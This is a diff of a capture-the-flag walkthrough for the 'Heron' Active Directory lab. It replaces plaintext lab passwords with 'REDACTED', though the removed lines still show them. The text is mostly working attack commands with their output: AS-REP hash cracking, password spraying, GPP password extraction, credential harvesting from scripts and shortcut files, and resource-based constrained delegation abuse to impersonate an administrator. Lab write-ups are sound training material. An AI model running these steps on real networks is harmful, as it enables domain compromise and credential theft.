@@ -128,21 +128,21 @@ Nice ! Now crack it : [https://www.thehacker.recipes/a-d/movement/credentials/cr
 
 ```bash
 hashcat --hash-type 18200 --attack-mode 0 ASREProastables.txt /usr/share/wordlists/rockyou.txt
-
-# samuel.davies;l6fkiy9oN
 ```
+
 Now let's try creds :
+
 ```bash
-nxc ldap "10.10.173.53" -u 'samuel.davies'  -p 'l6fkiy9oN'
+nxc ldap "10.10.173.53" -u 'samuel.davies'  -p 'REDACTED'
 
 SMB         10.10.173.53    445    MUCDC            [*] Windows Server 2022 Standard 20348 x64 (name:MUCDC) (domain:heron.vl) (signing:True) (SMBv1:True)
-LDAP        10.10.173.53    389    MUCDC            [+] heron.vl\samuel.davies:l6fkiy9oN
+LDAP        10.10.173.53    389    MUCDC            [+] heron.vl\samuel.davies:REDACTED
 ```
 ```bash
-nxc smb "10.10.173.53" -u 'samuel.davies'  -p 'l6fkiy9oN' --shares
+nxc smb "10.10.173.53" -u 'samuel.davies'  -p 'REDACTED' --shares
 
 SMB         10.10.173.53    445    MUCDC            [*] Windows Server 2022 Standard 20348 x64 (name:MUCDC) (domain:heron.vl) (signing:True) (SMBv1:True)
-SMB         10.10.173.53    445    MUCDC            [+] heron.vl\samuel.davies:l6fkiy9oN
+SMB         10.10.173.53    445    MUCDC            [+] heron.vl\samuel.davies:REDACTED
 SMB         10.10.173.53    445    MUCDC            [*] Enumerated shares
 SMB         10.10.173.53    445    MUCDC            Share           Permissions     Remark
 SMB         10.10.173.53    445    MUCDC            -----           -----------     ------
@@ -162,10 +162,10 @@ SMB         10.10.173.53    445    MUCDC            transfer$       READ,WRITE
 We can read in SYSVOL and we saw that there were service accounts (svc_web)
 
 ```bash
-nxc smb "10.10.173.53" -u 'samuel.davies'  -p 'l6fkiy9oN' -M gpp_password
+nxc smb "10.10.173.53" -u 'samuel.davies'  -p 'REDACTED' -M gpp_password
 
 GPP_PASS... 10.10.173.53    445    MUCDC            [+] Found credentials in 'heron.vl/Policies/{6CC75E8D-586E-4B13-BF80-B91BEF1F221C}/Machine/Preferences/Groups/Groups.xml'
-GPP_PASS... 10.10.173.53    445    MUCDC            Password: H3r0n2024#!
+GPP_PASS... 10.10.173.53    445    MUCDC            Password: REDACTED
 GPP_PASS... 10.10.173.53    445    MUCDC            action: U
 GPP_PASS... 10.10.173.53    445    MUCDC            newName: _local
 GPP_PASS... 10.10.173.53    445    MUCDC            fullName:
@@ -182,25 +182,25 @@ If you want to know how gpp password work : [https://infosecwriteups.com/attacki
 Nice ! Let's try this pass for every user we have :
 
 ```bash
-nxc ldap "10.10.173.53" -u users.txt  -p 'H3r0n2024#!' --continue-on-success | grep -I '[+]'
+nxc ldap "10.10.173.53" -u users.txt  -p 'REDACTED' --continue-on-success | grep -I '[+]'
 
-LDAP   10.10.173.53    389    MUCDC   [+] heronvl\svc-web-accounting-d:H3r0n2024#!
+LDAP   10.10.173.53    389    MUCDC   [+] heronvl\svc-web-accounting-d:REDACTED
 ```
 ```bash
-nxc ssh "10.10.173.54" -u users.txt  -p 'H3r0n2024#!' --continue-on-success | grep -I '[+]'
+nxc ssh "10.10.173.54" -u users.txt  -p 'REDACTED' --continue-on-success | grep -I '[+]'
 
-SSH                      10.10.173.54    22     10.10.173.54     [+] svc-web-accounting-d@heron.vl:H3r0n2024#!  Linux - Shell access!
+SSH                      10.10.173.54    22     10.10.173.54     [+] svc-web-accounting-d@heron.vl:REDACTED  Linux - Shell access!
 ```
 Now let's check what permissions we gained :
 
 ```bash
-nxc smb "10.10.173.53" -u 'svc-web-accounting-d'  -p 'H3r0n2024#!' --shares | grep -I 'WRITE'
+nxc smb "10.10.173.53" -u 'svc-web-accounting-d'  -p 'REDACTED' --shares | grep -I 'WRITE'
 
 SMB                      10.10.173.53    445    MUCDC            accounting$     READ,WRITE
 SMB                      10.10.173.53    445    MUCDC            transfer$       READ,WRITE
 
 # connect 
-smbclient.py "heron.vl"/"svc-web-accounting-d":'H3r0n2024#!'@"10.10.173.53"
+smbclient.py "heron.vl"/"svc-web-accounting-d":'REDACTED'@"10.10.173.53"
 ```
 ![alt text](../assets/image_heron/4er.png)
 
@@ -262,7 +262,7 @@ PS C:\Windows\scripts> cat ssh.ps1
 $plinkPath = "C:\Program Files\PuTTY\plink.exe"
 $targetMachine = "frajmp"
 $user = "_local"
-$password = "Deplete5DenialDealt"
+$password = "REDACTED"
 & "$plinkPath" -ssh -batch $user@$targetMachine -pw $password "ps auxf; ls -lah /home; exit"
 ```
 
@@ -270,7 +270,7 @@ Let's try the creds on the target linux machine
 
 ```bash
 svc-web-accounting-d@heron.vl@frajmp:~$ su _local
-Password: Deplete5DenialDealt
+Password: REDACTED
 
 _local@frajmp:/home/svc-web-accounting-d@heron.vl$ sudo -l
 Matching Defaults entries for _local on localhost:
@@ -288,9 +288,9 @@ We root the linux machine !!
 Ok now let's password spray
 
 ```bash
-nxc smb "10.10.173.53" -u users.txt  -p 'Deplete5DenialDealt' --continue-on-success | grep -I '[+]'
+nxc smb "10.10.173.53" -u users.txt  -p 'REDACTED' --continue-on-success | grep -I '[+]'
 
-SMB  10.10.173.53    445    MUCDC   [+] heron.vl\julian.pratt:Deplete5DenialDealt
+SMB  10.10.173.53    445    MUCDC   [+] heron.vl\julian.pratt:REDACTED
 ```
 Go in his home dir and we will find mucjmp.lnk file
 
@@ -299,21 +299,20 @@ Go in his home dir and we will find mucjmp.lnk file
 ```bash
 cat mucjmp.lnk
 2t`��ف+B�� �gP�O� �:i�+00�/C:\�1�X�sPROGRA~1t   ﾨR�B�X�s.BJz
-AProgram Files@shell32.dll,-21781P1�X�[PuTTY<   ﾺX�[�X�[.���PuTTY\2 ��X�� putty.exeD    ﾆX���X�[.putty.exeO-N�h�ZC:\Program Files\PuTTY\putty.exe#..\..\Program Files\PuTTY\putty.exeC:\Program Files\PuTTY$adm_prju@mucjmp -pw ayDMWV929N9wAiB4�&�
+AProgram Files@shell32.dll,-21781P1�X�[PuTTY<   ﾺX�[�X�[.���PuTTY\2 ��X�� putty.exeD    ﾆX���X�[.putty.exeO-N�h�ZC:\Program Files\PuTTY\putty.exe#..\..\Program Files\PuTTY\putty.exeC:\Program Files\PuTTY$adm_prju@mucjmp -pw REDACTED�&�
 
-# adm_prju;ayDMWV929N9wAiB4
 ```
 Verify Creds :
 
 ```bash
-nxc ldap "10.10.173.53" -u 'adm_prju'  -p 'ayDMWV929N9wAiB4' | grep -I '[+]'
+nxc ldap "10.10.173.53" -u 'adm_prju'  -p 'REDACTED' | grep -I '[+]'
 
-LDAP                     10.10.173.53    389    MUCDC            [+] heron.vl\adm_prju:ayDMWV929N9wAiB4
+LDAP                     10.10.173.53    389    MUCDC            [+] heron.vl\adm_prju:REDACTED
 ```
 Now let's do a bloodhoud (Note: when i made the box i had done it well before with Samuel.Davies but it was no usefull, so I'm only doing it now in the walkthrough)
 
 ```bash
-cme ldap heron.vl -u samuel.davies -p 'l6fkiy9oN' -k --bloodhound -ns 10.10.173.53 -c all
+cme ldap heron.vl -u samuel.davies -p 'REDACTED' -k --bloodhound -ns 10.10.173.53 -c all
 
 # Dont forgot to add 'mucdc.heron.vl' in your /etc/hosts
 ``` 
@@ -324,10 +323,10 @@ cme ldap heron.vl -u samuel.davies -p 'l6fkiy9oN' -k --bloodhound -ns 10.10.173.
 Let's abuse this : [https://www.thehacker.recipes/a-d/movement/kerberos/delegations/rbcd](https://www.thehacker.recipes/a-d/movement/kerberos/delegations/rbcd)
 
 ```bash
-nxc ldap "10.10.173.53" -u 'adm_prju'  -p 'ayDMWV929N9wAiB4' -M maq
+nxc ldap "10.10.173.53" -u 'adm_prju'  -p 'REDACTED' -M maq
 
 SMB         10.10.173.53    445    MUCDC            [*] Windows Server 2022 Standard 20348 x64 (name:MUCDC) (domain:heron.vl) (signing:True) (SMBv1:True)
-LDAP        10.10.173.53    389    MUCDC            [+] heron.vl\adm_prju:ayDMWV929N9wAiB4
+LDAP        10.10.173.53    389    MUCDC            [+] heron.vl\adm_prju:REDACTED
 MAQ         10.10.173.53    389    MUCDC            [*] Getting the MachineAccountQuota
 MAQ         10.10.173.53    389    MUCDC            MachineAccountQuota: 0
 ```
@@ -335,7 +334,7 @@ So we can't delegate with a null machine
 
 ```bash
 # create
-rbcd.py -delegate-from 'adm_prju' -delegate-to 'mucdc$' -dc-ip 10.10.173.53 -action 'write' 'heron.vl/adm_prju:ayDMWV929N9wAiB4'
+rbcd.py -delegate-from 'adm_prju' -delegate-to 'mucdc$' -dc-ip 10.10.173.53 -action 'write' 'heron.vl/adm_prju:REDACTED'
 Impacket v0.11.0 - Copyright 2023 Fortra
 
 [*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
@@ -345,15 +344,14 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 [*]     adm_prju     (S-1-5-21-1568358163-2901064146-3316491674-24596)
 
 # check 
-rbcd.py -delegate-to 'mucdc$' -dc-ip 10.10.173.53 -action 'read' 'heron.vl/adm_p
-rju:ayDMWV929N9wAiB4'
+rbcd.py -delegate-to 'mucdc$' -dc-ip 10.10.173.53 -action 'read' 'heron.vl/adm_prju:REDACTED'
 Impacket v0.11.0 - Copyright 2023 Fortra
 
 [*] Accounts allowed to act on behalf of other identity:
 [*]     adm_prju     (S-1-5-21-1568358163-2901064146-3316491674-24596)
 
 # AND NOW "TRY" TO DELEGATE BUT THIS HAPPENS
-getST.py -dc-ip 10.10.173.53 -spn cifs/mucdc.heron.vl 'heron.vl/adm_prju:ayDMWV929N9wAiB4' -impersonate _admin
+getST.py -dc-ip 10.10.173.53 -spn cifs/mucdc.heron.vl 'heron.vl/adm_prju:REDACTED' -impersonate _admin
 Impacket v0.11.0 - Copyright 2023 Fortra
 
 [-] CCache file is not found. Skipping...
@@ -373,11 +371,11 @@ This is normal but the writeup is long enough as it is so I put some links which
 
 ```bash
 # Obtain a TGT through overpass-the-hash to use RC4
-getTGT.py -hashes :$(pypykatz crypto nt 'ayDMWV929N9wAiB4') 'heron.vl'/'adm_prju'
+getTGT.py -hashes :$(pypykatz crypto nt 'REDACTED') 'heron.vl'/'adm_prju'
 # Obtain the TGT session key
 describeTicket.py 'adm_prju.ccache' | grep 'Ticket Session Key'
 # Change the controlledaccountwithoutSPN's NT hash with the TGT session key
-smbpasswd.py -newhashes :2b4fb5a299c89025e4a37065f877efda 'heron.vl'/'adm_prju':'ayDMWV929N9wAiB4'@'heron.vl'
+smbpasswd.py -newhashes :2b4fb5a299c89025e4a37065f877efda 'heron.vl'/'adm_prju':'REDACTED'@'heron.vl'
 # Set the .ccache
 export KRB5CCNAME='adm_prju.ccache'
 # S4U2self+U2U, followed by S4U2proxy
@@ -421,10 +419,10 @@ Then we can rbcd with a machine like this :
 
 ```bash
 # create
-rbcd.py -delegate-from 'frajmp$' -delegate-to 'mucdc$' -dc-ip 10.10.173.53 -action 'write' 'heron.vl/adm_prju:ayDMWV929N9wAiB4'
+rbcd.py -delegate-from 'frajmp$' -delegate-to 'mucdc$' -dc-ip 10.10.173.53 -action 'write' 'heron.vl/adm_prju:REDACTED'
 
 # check
-rbcd.py -delegate-to 'mucdc$' -dc-ip 10.10.173.53 -action 'read' 'heron.vl/adm_prju:ayDMWV929N9wAiB4'
+rbcd.py -delegate-to 'mucdc$' -dc-ip 10.10.173.53 -action 'read' 'heron.vl/adm_prju:REDACTED'
 
 # get ticket
 impacket-getST -dc-ip 10.10.173.53 -spn cifs/mucdc.heron.vl 'heron.vl/frajmp$' -impersonate _admin -hashes :6f[...]4f7
